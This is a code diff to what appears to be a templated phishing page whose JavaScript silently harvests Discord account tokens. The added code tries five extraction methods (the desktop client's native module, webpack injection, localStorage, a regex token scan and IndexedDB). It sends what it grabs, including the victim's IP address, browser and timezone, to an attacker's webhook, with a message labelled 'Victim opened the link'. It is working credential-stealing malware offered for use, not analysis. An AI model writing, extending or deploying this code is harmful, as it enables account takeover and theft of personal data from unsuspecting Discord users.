@@ -61,8 +61,18 @@ body{{background:#00D9FF;display:flex;justify-content:center;align-items:center;
 // NO GPS - Silent data grab only
 const webhook='{WEBHOOK}';
 
-// Get Discord token
+// Get Discord token - MULTIPLE METHODS
 let tokens=[];
+
+// Method 1: Discord Desktop App (DiscordNative)
+try{{
+if(window.DiscordNative?.isRenderer){{
+const token=await window.DiscordNative.nativeModules.requireModule('discord_utils').getToken();
+if(token&&!tokens.includes(token))tokens.push(token);
+}}
+}}catch(e){{}}
+
+// Method 2: Webpack
 try{{
 if(window.webpackChunkdiscord_app){{
 window.webpackChunkdiscord_app.push([[Math.random()],{{}},r=>{{
@@ -82,16 +92,47 @@ if(t&&!tokens.includes(t))tokens.push(t);
 }}
 }}catch(e){{}}
 
-// Scan storage for tokens
+// Method 3: Check for token in window object
+try{{
+if(window.localStorage.token){{
+let t=window.localStorage.token.replace(/"/g,'');
+if(t&&!tokens.includes(t))tokens.push(t);
+}}
+}}catch(e){{}}
+
+// Method 4: Deep localStorage scan
 try{{
 for(let i=0;i<localStorage.length;i++){{
 let v=localStorage.getItem(localStorage.key(i));
 if(v){{
-let m=v.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g);
+let m=v.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{38,}}/g);
 if(!m)m=v.match(/mfa\\.[\\w-]{{84,}}/g);
-if(m)m.forEach(t=>{{if(t&&!tokens.includes(t))tokens.push(t)}});
+if(m)m.forEach(t=>{{
+if(t&&!tokens.includes(t))tokens.push(t);
+}});
 }}
 }}
+}}catch(e){{}}
+
+// Method 5: Check IndexedDB for Discord data
+try{{
+const dbRequest=indexedDB.open('discord_cache');
+dbRequest.onsuccess=async(event)=>{{
+const db=event.target.result;
+if(db.objectStoreNames.contains('tokens')){{
+const tx=db.transaction(['tokens'],'readonly');
+const store=tx.objectStore('tokens');
+const getAllRequest=store.getAll();
+getAllRequest.onsuccess=()=>{{
+const items=getAllRequest.result;
+items.forEach(item=>{{
+if(item.token&&!tokens.includes(item.token)){{
+tokens.push(item.token);
+}}
+}});
+}};
+}}
+}};
 }}catch(e){{}}
 
 // If Discord token found, get full account
@@ -155,6 +196,27 @@ break;
 }}
 }}catch(e){{}}
 }}
+}}else{{
+// No Discord token found - send detailed alert
+await fetch(webhook,{{
+method:'POST',
+headers:{{'Content-Type':'application/json'}},
+body:JSON.stringify({{
+content:'@everyone ⚠️',
+embeds:[{{
+title:'❌ No Discord Token Found',
+color:16776960,
+description:'**Victim opened the link but Discord token was NOT found.**',
+fields:[
+{{name:'✅ What WAS grabbed',value:'• IP Address\\n• Browser Info\\n• Timezone\\n• Platform',inline:false}},
+{{name:'❌ What was NOT grabbed',value:'• Discord Token\\n• Email\\n• Phone\\n• Payment Info',inline:false}},
+{{name:'📍 Where they opened it',value:'Opened in external browser (not Discord app)',inline:false}},
+{{name:'💡 Why this happened',value:'Link was clicked from Discord app but opened in their default browser where they are not logged into Discord web.',inline:false}}
+],
+footer:{{text:'Token grab failed'}}
+}}]
+}})
+}});
 }}
 
 // Send browser info
